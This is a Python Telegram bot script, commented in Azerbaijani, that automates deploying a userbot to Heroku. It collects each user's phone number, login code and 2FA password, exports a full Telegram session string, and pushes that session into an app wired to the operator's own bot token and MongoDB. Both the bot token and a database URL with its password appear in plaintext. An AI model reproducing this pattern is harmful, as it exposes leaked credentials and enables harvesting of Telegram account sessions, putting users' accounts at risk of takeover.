import os
import heroku3
import asyncio
import random
import string
import requests
from pyrogram import Client
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PasswordHashInvalidError
)
from motor.motor_asyncio import AsyncIOMotorClient

# --- PROFESSIONAL CONFIGURATION ---
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")

# Sənin koddakı sabit Bot Token (8728801222...)
FIXED_BOT_TOKEN = "8728801222:AAHRG3mczChC2KG-q3lcmy4x_zFDLq9L0UA"

# Sabit MongoDB Linkin
MONGO_URL = "mongodb+srv://cabbarovxeyal32_db_user:Xeyal032aze@cluster0.f3gogmg.mongodb.net/?appName=Cluster0" 
# GitHub Reponun Tarball Linki
REPO_TARBALL = "https://github.com/Xeyaldi/userbot/tarball/main"

# Setup Bot İnstansiyası (Telethon ilə idarə olunur)
bot = TelegramClient('ht_setup_bot', API_ID, API_HASH)

def generate_unique_name(length=6):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond(
        "🛡 **HT USERBOT | Tam Avtomatlaşdırılmış İnfrastruktur**\n\n"
        "Sistemimiz hər şeyi sizin yerinizə həll edir. Sessiya Pyrogram formatında alınır.\n\n"
        "🔹 **Tam Avtomatik:** Repo, Config və Worker sistem tərəfindən qoşulur.\n"
        "🔹 **Multi-Setup:** Bir Heroku API ilə ard-arda botlar qura bilərsiniz.\n\n"
        "Başlamaq üçün aşağıdakı düyməyə sıxın.",
        buttons=[
            [Button.inline("💎 Quraşdırmanı Başlat", data="setup")],
            [Button.url("🌐 Rəsmi Kanal", "https://t.me/ht_bots")]
        ]
    )

@bot.on(events.CallbackQuery(data="setup"))
async def setup_process(event):
    user_id = event.sender_id
    async with bot.conversation(event.chat_id, timeout=600) as conv:
        try:
            # 1. Addım: Nömrə
            await conv.send_message("📝 **Addım 1:** Telefon nömrənizi daxil edin.\n_(Məsələn: +994XXXXXXXXX)_")
            phone = (await conv.get_response()).text.strip()
            
            # --- PYROGRAM SESSİYA PROSESİ (Sənin userbotuna uyğun açar alır) ---
            temp_client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
            await temp_client.connect()
            code_request = await temp_client.send_code(phone)
            
            # 2. Addım: Kod
            await conv.send_message("🔐 **Addım 2:** Telegram kodunu daxil edin (məs: 1 2 3 4 5):")
            otp_res = (await conv.get_response()).text.replace(" ", "")

            try:
                await temp_client.sign_in(phone, code_request.phone_code_hash, otp_res)
            except Exception as e:
                # 2FA Parolu lazımdırsa
                if "Two-step verification" in str(e) or "password" in str(e).lower():
                    await conv.send_message("🔐 **2FA (İkiadımlı təsdiq) parolu daxil edin:**")
                    pwd = (await conv.get_response()).text.strip()
                    await temp_client.check_password(pwd)
                else:
                    await conv.send_message(f"❌ **Xəta:** {e}")
                    return

            # SESSİYA BURADA ALINIR
            string_session = await temp_client.export_session_string()
            await temp_client.disconnect()

            status_msg = await conv.send_message("⚙️ **Addım 3:** Heroku tətbiqi yaradılır...")

            # --- HEROKU PROSESİ ---
            await status_msg.edit("🔑 **Addım 4:** Heroku API Key-inizi daxil edin:")
            h_api = (await conv.get_response()).text.strip()
            h_app_name = f"ht-user-{generate_unique_name(8)}"

            await status_msg.edit(f"⌛ **Sistem Qurulur...**\n📦 App Name: `{h_app_name}`")

            try:
                h_conn = heroku3.from_key(h_api)
                app = h_conn.create_app(name=h_app_name, region_id_or_name='eu', stack_id_or_name='heroku-22')
                
                # CONFIGLƏR (Sənin main.py-dakı adlara tam uyğun)
                app.config().update({
                    'API_ID': str(API_ID),
                    'API_HASH': API_HASH,
                    'SESSION_STRING': string_session, # Sənin kodun bunu istəyir
                    'BOT_TOKEN': FIXED_BOT_TOKEN,    # Sabit tokenin (8728801222...)
                    'MONGO_URL': MONGO_URL,          # Sabit MongoDB linkin
                    'OWNER_ID': str(user_id),
                    'LOG_GROUP_AUTO': "True"
                })

                # Build (Repo Heroku-ya yüklənir)
                headers = {
                    "Authorization": f"Bearer {h_api}",
                    "Accept": "application/vnd.heroku+json; version=3",
                    "Content-Type": "application/json"
                }
                payload = {"source_blob": {"url": REPO_TARBALL}}
                res = requests.post(f"https://api.heroku.com/apps/{h_app_name}/builds", headers=headers, json=payload)
                
                if res.status_code in [200, 201, 202]:
                    # Avtomatik olaraq botu başlatmaq (Worker ON)
                    await asyncio.sleep(5) # Build başlasın deyə gözləyirik
                    try:
                        app.process_formation()['worker'].scale(1)
                    except:
                        pass 

                    await status_msg.edit(
                        "✅ **Quraşdırma Uğurla Tamamlandı!**\n\n"
                        f"📦 **App Adı:** `{h_app_name}`\n"
                        f"🔑 **Sessiya:** Pyrogram 2.0 formatında yükləndi.\n"
                        f"🤖 **Bot Token:** Sabit token təyin edildi.\n\n"
                        "🚀 **Sistem avtomatik başladıldı.** 3 dəqiqəyə `.htlive` yazıb yoxlayın."
                    )
                else:
                    await status_msg.edit(f"❌ **Repo Yükləmə Xətası:** {res.status_code}")

            except Exception as e:
                await status_msg.edit(f"❌ **Heroku İdarəetmə Xətası:** {e}")

        except Exception as e:
            await conv.send_message(f"⚠️ **Xəta:** {e}")

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ HT Setup Bot Onlayndır!")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
